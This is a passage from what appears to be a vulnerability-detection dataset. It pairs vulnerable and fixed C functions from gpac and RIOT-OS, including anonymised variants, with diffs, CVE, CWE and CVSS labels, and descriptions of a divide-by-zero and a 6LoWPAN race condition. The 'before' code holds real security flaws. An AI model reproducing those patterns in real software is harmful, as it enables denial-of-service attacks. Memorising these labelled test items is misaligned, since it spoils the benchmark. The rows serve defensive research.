VAR_16->nal_unit_size = VAR_0->nal_length;
VAR_17->nal_unit_size = VAR_0->nal_length;
VAR_0->is_mvc = VAR_22;
VAR_11 = gf_list_count(VAR_0->sps);
for (VAR_10=0; VAR_10<VAR_11; VAR_10++) {
Bool VAR_23 = VAR_22;
GF_NALUFFParam *VAR_24 = gf_list_get(VAR_0->sps, VAR_10);
AVC_SPS *VAR_25 = &VAR_0->avc_state->sps[VAR_24->id];
u32 VAR_26 = VAR_24->data[0] & 0x1F;
if ((VAR_25->profile_idc == 118) || (VAR_25->profile_idc == 128)) {
VAR_0->is_mvc = VAR_13;
}
if (VAR_0->explicit) {
VAR_15 = VAR_17;
} else if (VAR_26 == VAR_27) {
VAR_15 = VAR_17;
VAR_23 = VAR_13;
} else {
VAR_15 = VAR_16;
}
if (VAR_12 || (VAR_23 && VAR_14) ) {
VAR_15->configurationVersion = 1;
VAR_15->profile_compatibility = VAR_25->prof_compat;
VAR_15->AVCProfileIndication = VAR_25->profile_idc;
VAR_15->AVCLevelIndication = VAR_25->level_idc;
VAR_15->chroma_format = VAR_25->chroma_format;
VAR_15->luma_bit_depth = 8 + VAR_25->luma_bit_depth_m8;
VAR_15->chroma_bit_depth = 8 + VAR_25->chroma_bit_depth_m8;
if (!gf_avcc_use_extensions(VAR_15->AVCProfileIndication)
&& ((VAR_15->chroma_format>1) || (VAR_15->luma_bit_depth>8) || (VAR_15->chroma_bit_depth>8))
) {
if ((VAR_15->luma_bit_depth>8) || (VAR_15->chroma_bit_depth>8)) {
VAR_15->AVCProfileIndication = 110;
} else {
VAR_15->AVCProfileIndication = (VAR_15->chroma_format==3) ? 244 : 122;
}
}
if (VAR_25->vui_parameters_present_flag && VAR_25->vui.par_num && VAR_25->vui.par_den) {
VAR_9->num = VAR_25->vui.par_num;
VAR_9->den = VAR_25->vui.par_den;
}
VAR_0->interlaced = VAR_25->frame_mbs_only_flag ? VAR_22 : VAR_13;
if (VAR_12 && (!VAR_0->fps.num || !VAR_0->fps.den) && VAR_25->vui.timing_info_present_flag
&& (VAR_25->vui.time_scale <= 1000*VAR_25->vui.num_units_in_tick)
) {
u8 VAR_28;
if (!VAR_25->vui.pic_struct_present_flag) {
VAR_28 = 1 + (1 - VAR_0->avc_state->s_info.field_pic_flag);
} else {
if (!VAR_0->avc_state->sei.pic_timing.pic_struct)
VAR_28 = 2;
else if (VAR_0->avc_state->sei.pic_timing.pic_struct == 8)
VAR_28 = 6;
else
VAR_28 = (VAR_0->avc_state->sei.pic_timing.pic_struct+1) / 2;
}
if (VAR_0->notime && VAR_25->vui.time_scale && VAR_25->vui.num_units_in_tick) {
VAR_0->cur_fps.num = 2 * VAR_25->vui.time_scale;
VAR_0->cur_fps.den = 2 * VAR_25->vui.num_units_in_tick * VAR_28;
if (!VAR_0->fps.num && VAR_0->dts==VAR_0->fps.den)
VAR_0->dts = VAR_0->cur_fps.den;
}
if (! VAR_25->vui.fixed_frame_rate_flag)
GF_LOG(VAR_29, VAR_30, (""[%s] Possible Variable Frame Rate: VUI \""fixed_frame_rate_flag\"" absent\n"", VAR_0->log_name));
}
VAR_0->fps = VAR_0->cur_fps;
}
VAR_12 = VAR_22;
if (VAR_23) {
VAR_14 = VAR_22;
if (VAR_25->width > VAR_20) VAR_20 = VAR_25->width;
if (VAR_25->height > VAR_21) VAR_21 = VAR_25->height;
} else {
if (VAR_25->width > VAR_18) VAR_18 = VAR_25->width;
if (VAR_25->height > VAR_19) VAR_19 = VAR_25->height;
}
if (!VAR_0->analyze)
gf_list_add(VAR_15->sequenceParameterSets, VAR_24);
}
VAR_15 = VAR_0->explicit ? VAR_17 : VAR_16;
VAR_11 = gf_list_count(VAR_0->sps_ext);
for (VAR_10=0; VAR_10<VAR_11; VAR_10++) {
GF_NALUFFParam *VAR_24 = gf_list_get(VAR_0->sps_ext, VAR_10);
if (!VAR_15->sequenceParameterSetExtensions) VAR_15->sequenceParameterSetExtensions = gf_list_new();
if (!VAR_0->analyze)
gf_list_add(VAR_15->sequenceParameterSetExtensions, VAR_24);
}
VAR_15 = VAR_0->explicit ? VAR_17 : VAR_16;
VAR_11 = gf_list_count(VAR_0->pps);
for (VAR_10=0; VAR_10<VAR_11; VAR_10++) {
GF_NALUFFParam *VAR_24 = gf_list_get(VAR_0->pps, VAR_10);
if (!VAR_0->analyze)
gf_list_add(VAR_15->pictureParameterSets, VAR_24);
}
VAR_15 = VAR_17;
VAR_11 = gf_list_count(VAR_0->pps_svc);
for (VAR_10=0; VAR_10<VAR_11; VAR_10++) {
GF_NALUFFParam *VAR_24 = gf_list_get(VAR_0->pps_svc, VAR_10);
if (!VAR_0->analyze)
gf_list_add(VAR_15->pictureParameterSets, VAR_24);
}
*VAR_1 = *VAR_3 = NULL;
*VAR_2 = *VAR_4 = 0;
if (VAR_0->explicit) {
gf_odf_avc_cfg_write(VAR_17, VAR_1, VAR_2);
} else {
gf_odf_avc_cfg_write(VAR_16, VAR_1, VAR_2);
if (gf_list_count(VAR_17->sequenceParameterSets) || VAR_17->sequenceParameterSetExtensions) {
gf_odf_avc_cfg_write(VAR_17, VAR_3, VAR_4);
}
}
gf_list_reset(VAR_16->sequenceParameterSets);
gf_list_reset(VAR_16->sequenceParameterSetExtensions);
gf_list_reset(VAR_16->pictureParameterSets);
gf_list_reset(VAR_17->sequenceParameterSets);
gf_list_reset(VAR_17->sequenceParameterSetExtensions);
gf_list_reset(VAR_17->pictureParameterSets);
gf_odf_avc_cfg_del(VAR_16);
gf_odf_avc_cfg_del(VAR_17);
*VAR_5 = VAR_18;
*VAR_6 = VAR_19;
*VAR_7 = VAR_20;
*VAR_8 = VAR_21;
return VAR_13;
}",gpac/047f96fb39e6bf70cb9f344093f5886e51dce0ac/reframe_nalu.c/vul/before/0.json,"Bool naludmx_create_avc_decoder_config(GF_NALUDmxCtx *ctx, u8 **dsi, u32 *dsi_size, u8 **dsi_enh, u32 *dsi_enh_size, u32 *max_width, u32 *max_height, u32 *max_enh_width, u32 *max_enh_height, GF_Fraction *sar)
{
	u32 i, count;
	Bool first = GF_TRUE;
	Bool first_svc = GF_TRUE;
	GF_AVCConfig *cfg;
	GF_AVCConfig *avcc;
	GF_AVCConfig *svcc;
	u32 max_w, max_h, max_ew, max_eh;


	max_w = max_h = max_ew = max_eh = 0;
	sar->num = sar->den = 0;

	if (!ctx->analyze && (!gf_list_count(ctx->sps) || !gf_list_count(ctx->pps)))
		return GF_FALSE;

	avcc = gf_odf_avc_cfg_new();
	svcc = gf_odf_avc_cfg_new();
	avcc->nal_unit_size = ctx->nal_length;
	svcc->nal_unit_size = ctx->nal_length;

	ctx->is_mvc = GF_FALSE;
	count = gf_list_count(ctx->sps);
	for (i=0; i<count; i++) {
		Bool is_svc = GF_FALSE;
		GF_NALUFFParam *sl = gf_list_get(ctx->sps, i);
		AVC_SPS *sps = &ctx->avc_state->sps[sl->id];
		u32 nal_type = sl->data[0] & 0x1F;

		if ((sps->profile_idc == 118) || (sps->profile_idc == 128)) {
			ctx->is_mvc = GF_TRUE;
		}

		if (ctx->explicit) {
			cfg = svcc;
		} else if (nal_type == GF_AVC_NALU_SVC_SUBSEQ_PARAM) {
			cfg = svcc;
			is_svc = GF_TRUE;
		} else {
			cfg = avcc;
		}

		if (first || (is_svc && first_svc) ) {
			cfg->configurationVersion = 1;
			cfg->profile_compatibility = sps->prof_compat;
			cfg->AVCProfileIndication = sps->profile_idc;
			cfg->AVCLevelIndication = sps->level_idc;
			cfg->chroma_format = sps->chroma_format;
			cfg->luma_bit_depth = 8 + sps->luma_bit_depth_m8;
			cfg->chroma_bit_depth = 8 + sps->chroma_bit_depth_m8;
			/*try to patch ?*/
			if (!gf_avcc_use_extensions(cfg->AVCProfileIndication)
				&& ((cfg->chroma_format>1) || (cfg->luma_bit_depth>8) || (cfg->chroma_bit_depth>8))
			) {
				if ((cfg->luma_bit_depth>8) || (cfg->chroma_bit_depth>8)) {
					cfg->AVCProfileIndication = 110;
				} else {
					cfg->AVCProfileIndication = (cfg->chroma_format==3) ? 244 : 122;
				}
			}
			if (sps->vui_parameters_present_flag && sps->vui.par_num && sps->vui.par_den) {
				sar->num = sps->vui.par_num;
				sar->den = sps->vui.par_den;
			}
			ctx->interlaced = sps->frame_mbs_only_flag ? GF_FALSE : GF_TRUE;


			/*disable frame rate scan, most bitstreams have wrong values there*/
			if (first && (!ctx->fps.num || !ctx->fps.den) && sps->vui.timing_info_present_flag
				/*if detected FPS is greater than 1000, assume wrong timing info*/
				&& (sps->vui.time_scale <= 1000*sps->vui.num_units_in_tick)
			) {
				/*ISO/IEC 14496-10 n11084 Table E-6*/
				/* not used :				u8 DeltaTfiDivisorTable[] = {1,1,1,2,2,2,2,3,3,4,6}; */
				u8 DeltaTfiDivisorIdx;
				if (!sps->vui.pic_struct_present_flag) {
					DeltaTfiDivisorIdx = 1 + (1 - ctx->avc_state->s_info.field_pic_flag);
				} else {
					if (!ctx->avc_state->sei.pic_timing.pic_struct)
						DeltaTfiDivisorIdx = 2;
					else if (ctx->avc_state->sei.pic_timing.pic_struct == 8)
						DeltaTfiDivisorIdx = 6;
					else
						DeltaTfiDivisorIdx = (ctx->avc_state->sei.pic_timing.pic_struct+1) / 2;
				}
				if (ctx->notime) {
					u32 fps_num = 2 * sps->vui.time_scale;
					u32 fps_den = 2 * sps->vui.num_units_in_tick * DeltaTfiDivisorIdx;
					if (fps_num && fps_den) {
						ctx->cur_fps.num = fps_num;
						ctx->cur_fps.den = fps_den;
					}
					if (!ctx->fps.num && ctx->dts==ctx->fps.den)
						ctx->dts = ctx->cur_fps.den;
				}
				if (! sps->vui.fixed_frame_rate_flag)
					GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[%s] Possible Variable Frame Rate: VUI \""fixed_frame_rate_flag\"" absent\n"", ctx->log_name));
			}
			ctx->fps = ctx->cur_fps;
		}
		first = GF_FALSE;
		if (is_svc) {
			first_svc = GF_FALSE;
			if (sps->width > max_ew) max_ew = sps->width;
			if (sps->height > max_eh) max_eh = sps->height;
		} else {
			if (sps->width > max_w) max_w = sps->width;
			if (sps->height > max_h) max_h = sps->height;
		}
		if (!ctx->analyze)
			gf_list_add(cfg->sequenceParameterSets, sl);
	}

	cfg = ctx->explicit ? svcc : avcc;
	count = gf_list_count(ctx->sps_ext);
	for (i=0; i<count; i++) {
		GF_NALUFFParam *sl = gf_list_get(ctx->sps_ext, i);
		if (!cfg->sequenceParameterSetExtensions) cfg->sequenceParameterSetExtensions = gf_list_new();
		if (!ctx->analyze)
			gf_list_add(cfg->sequenceParameterSetExtensions, sl);
	}

	cfg = ctx->explicit ? svcc : avcc;
	count = gf_list_count(ctx->pps);
	for (i=0; i<count; i++) {
		GF_NALUFFParam *sl = gf_list_get(ctx->pps, i);
		if (!ctx->analyze)
			gf_list_add(cfg->pictureParameterSets, sl);
	}

	cfg = svcc;
	count = gf_list_count(ctx->pps_svc);
	for (i=0; i<count; i++) {
		GF_NALUFFParam *sl = gf_list_get(ctx->pps_svc, i);
		if (!ctx->analyze)
			gf_list_add(cfg->pictureParameterSets, sl);
	}

	*dsi = *dsi_enh = NULL;
	*dsi_size = *dsi_enh_size = 0;

	if (ctx->explicit) {
		gf_odf_avc_cfg_write(svcc, dsi, dsi_size);
	} else {
		gf_odf_avc_cfg_write(avcc, dsi, dsi_size);
		if (gf_list_count(svcc->sequenceParameterSets) || svcc->sequenceParameterSetExtensions) {
			gf_odf_avc_cfg_write(svcc, dsi_enh, dsi_enh_size);
		}
	}
	gf_list_reset(avcc->sequenceParameterSets);
	gf_list_reset(avcc->sequenceParameterSetExtensions);
	gf_list_reset(avcc->pictureParameterSets);
	gf_list_reset(svcc->sequenceParameterSets);
	gf_list_reset(svcc->sequenceParameterSetExtensions);
	gf_list_reset(svcc->pictureParameterSets);
	gf_odf_avc_cfg_del(avcc);
	gf_odf_avc_cfg_del(svcc);
	*max_width = max_w;
	*max_height = max_h;
	*max_enh_width = max_ew;
	*max_enh_height = max_eh;
	return GF_TRUE;
}","Bool naludmx_create_avc_decoder_config(GF_NALUDmxCtx *VAR_0, u8 **VAR_1, u32 *VAR_2, u8 **VAR_3, u32 *VAR_4, u32 *VAR_5, u32 *VAR_6, u32 *VAR_7, u32 *VAR_8, GF_Fraction *VAR_9)
{
	u32 VAR_10, VAR_11;
	Bool VAR_12 = VAR_13;
	Bool VAR_14 = VAR_13;
	GF_AVCConfig *VAR_15;
	GF_AVCConfig *VAR_16;
	GF_AVCConfig *VAR_17;
	u32 VAR_18, VAR_19, VAR_20, VAR_21;


	VAR_18 = VAR_19 = VAR_20 = VAR_21 = 0;
	VAR_9->num = VAR_9->den = 0;

	if (!VAR_0->analyze && (!gf_list_count(VAR_0->sps) || !gf_list_count(VAR_0->pps)))
		return VAR_22;

	VAR_16 = gf_odf_avc_cfg_new();
	VAR_17 = gf_odf_avc_cfg_new();
	VAR_16->nal_unit_size = VAR_0->nal_length;
	VAR_17->nal_unit_size = VAR_0->nal_length;

	VAR_0->is_mvc = VAR_22;
	VAR_11 = gf_list_count(VAR_0->sps);
	for (VAR_10=0; VAR_10<VAR_11; VAR_10++) {
		Bool VAR_23 = VAR_22;
		GF_NALUFFParam *VAR_24 = gf_list_get(VAR_0->sps, VAR_10);
		AVC_SPS *VAR_25 = &VAR_0->avc_state->sps[VAR_24->id];
		u32 VAR_26 = VAR_24->data[0] & 0x1F;

		if ((VAR_25->profile_idc == 118) || (VAR_25->profile_idc == 128)) {
			VAR_0->is_mvc = VAR_13;
		}

		if (VAR_0->explicit) {
			VAR_15 = VAR_17;
		} else if (VAR_26 == VAR_27) {
			VAR_15 = VAR_17;
			VAR_23 = VAR_13;
		} else {
			VAR_15 = VAR_16;
		}

		if (VAR_12 || (VAR_23 && VAR_14) ) {
			VAR_15->configurationVersion = 1;
			VAR_15->profile_compatibility = VAR_25->prof_compat;
			VAR_15->AVCProfileIndication = VAR_25->profile_idc;
			VAR_15->AVCLevelIndication = VAR_25->level_idc;
			VAR_15->chroma_format = VAR_25->chroma_format;
			VAR_15->luma_bit_depth = 8 + VAR_25->luma_bit_depth_m8;
			VAR_15->chroma_bit_depth = 8 + VAR_25->chroma_bit_depth_m8;
			/* COMMENT_0 */
			if (!gf_avcc_use_extensions(VAR_15->AVCProfileIndication)
				&& ((VAR_15->chroma_format>1) || (VAR_15->luma_bit_depth>8) || (VAR_15->chroma_bit_depth>8))
			) {
				if ((VAR_15->luma_bit_depth>8) || (VAR_15->chroma_bit_depth>8)) {
					VAR_15->AVCProfileIndication = 110;
				} else {
					VAR_15->AVCProfileIndication = (VAR_15->chroma_format==3) ? 244 : 122;
				}
			}
			if (VAR_25->vui_parameters_present_flag && VAR_25->vui.par_num && VAR_25->vui.par_den) {
				VAR_9->num = VAR_25->vui.par_num;
				VAR_9->den = VAR_25->vui.par_den;
			}
			VAR_0->interlaced = VAR_25->frame_mbs_only_flag ? VAR_22 : VAR_13;


			/* COMMENT_1 */
			if (VAR_12 && (!VAR_0->fps.num || !VAR_0->fps.den) && VAR_25->vui.timing_info_present_flag
				/* COMMENT_2 */
				&& (VAR_25->vui.time_scale <= 1000*VAR_25->vui.num_units_in_tick)
			) {
				/* COMMENT_3 */
				/* COMMENT_4 */
				u8 VAR_28;
				if (!VAR_25->vui.pic_struct_present_flag) {
					VAR_28 = 1 + (1 - VAR_0->avc_state->s_info.field_pic_flag);
				} else {
					if (!VAR_0->avc_state->sei.pic_timing.pic_struct)
						VAR_28 = 2;
					else if (VAR_0->avc_state->sei.pic_timing.pic_struct == 8)
						VAR_28 = 6;
					else
						VAR_28 = (VAR_0->avc_state->sei.pic_timing.pic_struct+1) / 2;
				}
				if (VAR_0->notime) {
					u32 VAR_29 = 2 * VAR_25->vui.time_scale;
					u32 VAR_30 = 2 * VAR_25->vui.num_units_in_tick * VAR_28;
					if (VAR_29 && VAR_30) {
						VAR_0->cur_fps.num = VAR_29;
						VAR_0->cur_fps.den = VAR_30;
					}
					if (!VAR_0->fps.num && VAR_0->dts==VAR_0->fps.den)
						VAR_0->dts = VAR_0->cur_fps.den;
				}
				if (! VAR_25->vui.fixed_frame_rate_flag)
					GF_LOG(VAR_31, VAR_32, (""[%s] Possible Variable Frame Rate: VUI \""fixed_frame_rate_flag\"" absent\n"", VAR_0->log_name));
			}
			VAR_0->fps = VAR_0->cur_fps;
		}
		VAR_12 = VAR_22;
		if (VAR_23) {
			VAR_14 = VAR_22;
			if (VAR_25->width > VAR_20) VAR_20 = VAR_25->width;
			if (VAR_25->height > VAR_21) VAR_21 = VAR_25->height;
		} else {
			if (VAR_25->width > VAR_18) VAR_18 = VAR_25->width;
			if (VAR_25->height > VAR_19) VAR_19 = VAR_25->height;
		}
		if (!VAR_0->analyze)
			gf_list_add(VAR_15->sequenceParameterSets, VAR_24);
	}

	VAR_15 = VAR_0->explicit ? VAR_17 : VAR_16;
	VAR_11 = gf_list_count(VAR_0->sps_ext);
	for (VAR_10=0; VAR_10<VAR_11; VAR_10++) {
		GF_NALUFFParam *VAR_24 = gf_list_get(VAR_0->sps_ext, VAR_10);
		if (!VAR_15->sequenceParameterSetExtensions) VAR_15->sequenceParameterSetExtensions = gf_list_new();
		if (!VAR_0->analyze)
			gf_list_add(VAR_15->sequenceParameterSetExtensions, VAR_24);
	}

	VAR_15 = VAR_0->explicit ? VAR_17 : VAR_16;
	VAR_11 = gf_list_count(VAR_0->pps);
	for (VAR_10=0; VAR_10<VAR_11; VAR_10++) {
		GF_NALUFFParam *VAR_24 = gf_list_get(VAR_0->pps, VAR_10);
		if (!VAR_0->analyze)
			gf_list_add(VAR_15->pictureParameterSets, VAR_24);
	}

	VAR_15 = VAR_17;
	VAR_11 = gf_list_count(VAR_0->pps_svc);
	for (VAR_10=0; VAR_10<VAR_11; VAR_10++) {
		GF_NALUFFParam *VAR_24 = gf_list_get(VAR_0->pps_svc, VAR_10);
		if (!VAR_0->analyze)
			gf_list_add(VAR_15->pictureParameterSets, VAR_24);
	}

	*VAR_1 = *VAR_3 = NULL;
	*VAR_2 = *VAR_4 = 0;

	if (VAR_0->explicit) {
		gf_odf_avc_cfg_write(VAR_17, VAR_1, VAR_2);
	} else {
		gf_odf_avc_cfg_write(VAR_16, VAR_1, VAR_2);
		if (gf_list_count(VAR_17->sequenceParameterSets) || VAR_17->sequenceParameterSetExtensions) {
			gf_odf_avc_cfg_write(VAR_17, VAR_3, VAR_4);
		}
	}
	gf_list_reset(VAR_16->sequenceParameterSets);
	gf_list_reset(VAR_16->sequenceParameterSetExtensions);
	gf_list_reset(VAR_16->pictureParameterSets);
	gf_list_reset(VAR_17->sequenceParameterSets);
	gf_list_reset(VAR_17->sequenceParameterSetExtensions);
	gf_list_reset(VAR_17->pictureParameterSets);
	gf_odf_avc_cfg_del(VAR_16);
	gf_odf_avc_cfg_del(VAR_17);
	*VAR_5 = VAR_18;
	*VAR_6 = VAR_19;
	*VAR_7 = VAR_20;
	*VAR_8 = VAR_21;
	return VAR_13;
}",gpac/047f96fb39e6bf70cb9f344093f5886e51dce0ac/reframe_nalu.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -84,10 +84,13 @@
 					else
 						DeltaTfiDivisorIdx = (ctx->avc_state->sei.pic_timing.pic_struct+1) / 2;
 				}
-				if (ctx->notime && sps->vui.time_scale && sps->vui.num_units_in_tick) {
-					ctx->cur_fps.num = 2 * sps->vui.time_scale;
-					ctx->cur_fps.den = 2 * sps->vui.num_units_in_tick * DeltaTfiDivisorIdx;
-
+				if (ctx->notime) {
+					u32 fps_num = 2 * sps->vui.time_scale;
+					u32 fps_den = 2 * sps->vui.num_units_in_tick * DeltaTfiDivisorIdx;
+					if (fps_num && fps_den) {
+						ctx->cur_fps.num = fps_num;
+						ctx->cur_fps.den = fps_den;
+					}
 					if (!ctx->fps.num && ctx->dts==ctx->fps.den)
 						ctx->dts = ctx->cur_fps.den;
 				}","{'deleted_lines': ['\t\t\t\tif (ctx->notime && sps->vui.time_scale && sps->vui.num_units_in_tick) {', '\t\t\t\t\tctx->cur_fps.num = 2 * sps->vui.time_scale;', '\t\t\t\t\tctx->cur_fps.den = 2 * sps->vui.num_units_in_tick * DeltaTfiDivisorIdx;', ''], 'added_lines': ['\t\t\t\tif (ctx->notime) {', '\t\t\t\t\tu32 fps_num = 2 * sps->vui.time_scale;', '\t\t\t\t\tu32 fps_den = 2 * sps->vui.num_units_in_tick * DeltaTfiDivisorIdx;', '\t\t\t\t\tif (fps_num && fps_den) {', '\t\t\t\t\t\tctx->cur_fps.num = fps_num;', '\t\t\t\t\t\tctx->cur_fps.den = fps_den;', '\t\t\t\t\t}']}",True,Divide By Zero in GitHub repository gpac/gpac prior to 2.2.2.,7.5,HIGH,2,valid,2023-05-22T15:48:08Z,4
CVE-2023-33974,['CWE-362'],CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H,1,RIOT-OS/RIOT,gnrc_sixlowpan_frag_sfr: fix ARQ scheduler race-condition,31c6191f6196f1a05c9765cffeadba868e3b0723,https://github.com/RIOT-OS/RIOT/commit/31c6191f6196f1a05c9765cffeadba868e3b0723,sys/net/gnrc/network_layer/sixlowpan/frag/sfr/gnrc_sixlowpan_frag_sfr.c,_clean_slate_datagram,"static void _clean_slate_datagram(gnrc_sixlowpan_frag_fb_t *fbuf)
{
clist_node_t new_queue = { .next = NULL };
fbuf->sfr.arq_timeout_event.msg.content.ptr = NULL;
evtimer_del((evtimer_t *)(&_arq_timer),
&fbuf->sfr.arq_timeout_event.event);
fbuf->sfr.arq_timeout_event.event.next = NULL;
if (gnrc_sixlowpan_frag_sfr_congure_snd_has_inter_frame_gap()) {
for (clist_node_t *node = clist_lpop(&_frame_queue);
node != NULL; node = clist_lpop(&_frame_queue)) {
_frame_queue_t *entry = (_frame_queue_t *)node;
if (entry->datagram_tag == fbuf->tag) {
gnrc_pktbuf_release(entry->frame);
entry->frame = NULL;
clist_rpush(&_frag_descs_free, node);
}
else {
clist_rpush(&new_queue, node);
}
}
_frame_queue = new_queue;
}
fbuf->offset = 0U;
fbuf->sfr.cur_seq = 0U;
fbuf->sfr.frags_sent = 0U;
for (clist_node_t *node = clist_lpop(&fbuf->sfr.window);
node != NULL; node = clist_lpop(&fbuf->sfr.window)) {
clist_rpush(&_frag_descs_free, node);
}
}","static void _clean_slate_datagram(gnrc_sixlowpan_frag_fb_t *VAR_0)
{
clist_node_t VAR_1 = { .next = NULL };
VAR_0->sfr.arq_timeout_event.msg.content.ptr = NULL;
evtimer_del((evtimer_t *)(&VAR_2),
&VAR_0->sfr.arq_timeout_event.event);
VAR_0->sfr.arq_timeout_event.event.next = NULL;
if (gnrc_sixlowpan_frag_sfr_congure_snd_has_inter_frame_gap()) {
for (clist_node_t *VAR_3 = clist_lpop(&VAR_4);
VAR_3 != NULL; VAR_3 = clist_lpop(&VAR_4)) {
_frame_queue_t *VAR_5 = (_frame_queue_t *)VAR_3;
if (VAR_5->datagram_tag == VAR_0->tag) {
gnrc_pktbuf_release(VAR_5->frame);
VAR_5->frame = NULL;
clist_rpush(&VAR_6, VAR_3);
}
else {
clist_rpush(&VAR_1, VAR_3);
}
}
VAR_4 = VAR_1;
}
VAR_0->offset = 0U;
VAR_0->sfr.cur_seq = 0U;
VAR_0->sfr.frags_sent = 0U;
for (clist_node_t *VAR_3 = clist_lpop(&VAR_0->sfr.window);
VAR_3 != NULL; VAR_3 = clist_lpop(&VAR_0->sfr.window)) {
clist_rpush(&VAR_6, VAR_3);
}
}",RIOT-OS/RIOT/31c6191f6196f1a05c9765cffeadba868e3b0723/gnrc_sixlowpan_frag_sfr.c/vul/before/3.json,"static void _clean_slate_datagram(gnrc_sixlowpan_frag_fb_t *fbuf)
{
    clist_node_t new_queue = { .next = NULL };

    fbuf->sfr.arq_timeout_event.msg.content.ptr = NULL;
    /* remove potentially scheduled timers for this datagram */
    evtimer_del((evtimer_t *)(&_arq_timer),
                &fbuf->sfr.arq_timeout_event.event);
    if (gnrc_sixlowpan_frag_sfr_congure_snd_has_inter_frame_gap()) {
        for (clist_node_t *node = clist_lpop(&_frame_queue);
             node != NULL; node = clist_lpop(&_frame_queue)) {
            _frame_queue_t *entry = (_frame_queue_t *)node;
            /* remove frames of this datagram from frame queue */
            if (entry->datagram_tag == fbuf->tag) {
                gnrc_pktbuf_release(entry->frame);
                /* unset packet just to be safe */
                entry->frame = NULL;
                clist_rpush(&_frag_descs_free, node);
            }
            else {
                clist_rpush(&new_queue, node);
            }
        }
        /* reset frame queue with remaining frames */
        _frame_queue = new_queue;
    }
    fbuf->offset = 0U;
    fbuf->sfr.cur_seq = 0U;
    fbuf->sfr.frags_sent = 0U;
    for (clist_node_t *node = clist_lpop(&fbuf->sfr.window);
         node != NULL; node = clist_lpop(&fbuf->sfr.window)) {
        clist_rpush(&_frag_descs_free, node);
    }
}","static void _clean_slate_datagram(gnrc_sixlowpan_frag_fb_t *VAR_0)
{
    clist_node_t VAR_1 = { .next = NULL };

    VAR_0->sfr.arq_timeout_event.msg.content.ptr = NULL;
    /* COMMENT_0 */
    evtimer_del((evtimer_t *)(&VAR_2),
                &VAR_0->sfr.arq_timeout_event.event);
    if (gnrc_sixlowpan_frag_sfr_congure_snd_has_inter_frame_gap()) {
        for (clist_node_t *VAR_3 = clist_lpop(&VAR_4);
             VAR_3 != NULL; VAR_3 = clist_lpop(&VAR_4)) {
            _frame_queue_t *VAR_5 = (_frame_queue_t *)VAR_3;
            /* COMMENT_1 */
            if (VAR_5->datagram_tag == VAR_0->tag) {
                gnrc_pktbuf_release(VAR_5->frame);
                /* COMMENT_2 */
                VAR_5->frame = NULL;
                clist_rpush(&VAR_6, VAR_3);
            }
            else {
                clist_rpush(&VAR_1, VAR_3);
            }
        }
        /* COMMENT_3 */
        VAR_4 = VAR_1;
    }
    VAR_0->offset = 0U;
    VAR_0->sfr.cur_seq = 0U;
    VAR_0->sfr.frags_sent = 0U;
    for (clist_node_t *VAR_3 = clist_lpop(&VAR_0->sfr.window);
         VAR_3 != NULL; VAR_3 = clist_lpop(&VAR_0->sfr.window)) {
        clist_rpush(&VAR_6, VAR_3);
    }
}",RIOT-OS/RIOT/31c6191f6196f1a05c9765cffeadba868e3b0723/gnrc_sixlowpan_frag_sfr.c/vul/after/3.json,"--- func_before
+++ func_after
@@ -6,7 +6,6 @@
     /* remove potentially scheduled timers for this datagram */
     evtimer_del((evtimer_t *)(&_arq_timer),
                 &fbuf->sfr.arq_timeout_event.event);
-    fbuf->sfr.arq_timeout_event.event.next = NULL;
     if (gnrc_sixlowpan_frag_sfr_congure_snd_has_inter_frame_gap()) {
         for (clist_node_t *node = clist_lpop(&_frame_queue);
              node != NULL; node = clist_lpop(&_frame_queue)) {","{'deleted_lines': ['    fbuf->sfr.arq_timeout_event.event.next = NULL;'], 'added_lines': []}",True,"RIOT-OS, an operating system for Internet of Things (IoT) devices, contains a network stack with the ability to process 6LoWPAN frames. In versions 2023.01 and prior, an attacker can send multiple crafted frames to the device to trigger a race condition. The race condition invalidates assumptions about the program state and leads to an invalid memory access resulting in denial of service. This issue is patched in pull request 19679. There are no known workarounds.",7.5,HIGH,2,valid,2023-05-30T12:32:18Z,4
CVE-2023-33974,['CWE-362'],CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H,1,RIOT-OS/RIOT,gnrc_sixlowpan_frag_sfr: fix ARQ scheduler race-condition,31c6191f6196f1a05c9765cffeadba868e3b0723,https://github.com/RIOT-OS/RIOT/commit/31c6191f6196f1a05c9765cffeadba868e3b0723,sys/net/gnrc/network_layer/sixlowpan/frag/sfr/gnrc_sixlowpan_frag_sfr.c,_sched_arq_timeout,"static void _sched_arq_timeout(gnrc_sixlowpan_frag_fb_t *fbuf, uint32_t offset)
{
if (IS_ACTIVE(CONFIG_GNRC_SIXLOWPAN_SFR_MOCK_ARQ_TIMER)) {
return;
}
if (fbuf->sfr.arq_timeout_event.msg.content.ptr != NULL) {
DEBUG(""6lo sfr: ARQ timeout for datagram %u already scheduled\n"",
(uint8_t)fbuf->tag);
return;
}
DEBUG(""6lo sfr: arming ACK timeout in %lums for datagram %u\n"",
(long unsigned)offset, fbuf->tag);
fbuf->sfr.arq_timeout_event.event.offset = offset;
fbuf->sfr.arq_timeout_event.msg.content.ptr = fbuf;
fbuf->sfr.arq_timeout_event.msg.type = GNRC_SIXLOWPAN_FRAG_SFR_ARQ_TIMEOUT_MSG;
evtimer_add_msg(&_arq_timer, &fbuf->sfr.arq_timeout_event,
_getpid());
}","static void _sched_arq_timeout(gnrc_sixlowpan_frag_fb_t *VAR_0, uint32_t VAR_1)
{
if (IS_ACTIVE(VAR_2)) {
return;
}
if (VAR_0->sfr.arq_timeout_event.msg.content.ptr != NULL) {
DEBUG(""6lo sfr: ARQ timeout for datagram %u already scheduled\n"",
(uint8_t)VAR_0->tag);
return;
}
DEBUG(""6lo sfr: arming ACK timeout in %lums for datagram %u\n"",
(long unsigned)VAR_1, VAR_0->tag);
VAR_0->sfr.arq_timeout_event.event.offset = VAR_1;
VAR_0->sfr.arq_timeout_event.msg.content.ptr = VAR_0;
VAR_0->sfr.arq_timeout_event.msg.type = VAR_3;
evtimer_add_msg(&VAR_4, &VAR_0->sfr.arq_timeout_event,
_getpid());
}",RIOT-OS/RIOT/31c6191f6196f1a05c9765cffeadba868e3b0723/gnrc_sixlowpan_frag_sfr.c/vul/before/1.json,"static void _sched_arq_timeout(gnrc_sixlowpan_frag_fb_t *fbuf, uint32_t offset)
{
    if (IS_ACTIVE(CONFIG_GNRC_SIXLOWPAN_SFR_MOCK_ARQ_TIMER)) {
        /* mock does not need to be scheduled */
        return;
    }
    if (_arq_scheduled(fbuf)) {
